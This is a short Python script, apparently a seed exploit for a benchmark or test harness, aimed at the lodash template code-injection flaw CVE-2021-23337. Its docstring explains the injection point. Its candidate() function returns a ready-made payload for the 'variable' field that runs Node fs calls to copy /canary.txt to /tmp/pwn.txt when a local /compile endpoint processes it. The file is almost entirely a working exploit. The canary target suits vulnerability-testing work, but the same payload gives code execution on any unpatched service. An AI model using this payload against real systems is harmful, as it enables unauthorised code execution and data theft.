#!/usr/bin/env python3
"""[GIVEN] CVE-2021-23337 seed exploit for lodash-cve-2026-4800.

options.variable value flows into the compiled function parameter list. A
default-parameter payload `x=<expr>` executes at call time (compiled() called
with no args). Payload writes the /canary.txt content to /tmp/pwn.txt.

Reaches the flag on v0 (4.17.20); BLOCKED on v1 (4.17.21, variable validated).

Candidate contract: returns {"body": {source, variable}} — the seed_exec POSTs
this body to /compile and the effect is verified by reading /tmp/pwn.txt back.
"""
import json


def candidate(*, base="http://127.0.0.1:55111"):
    payload = {
        "source": "X",
        "variable": 'x=process.getBuiltinModule("fs").writeFileSync("/tmp/pwn.txt", process.getBuiltinModule("fs").readFileSync("/canary.txt"))'
    }
    return {"body": payload}


if __name__ == "__main__":
    print(json.dumps(candidate(), indent=2))
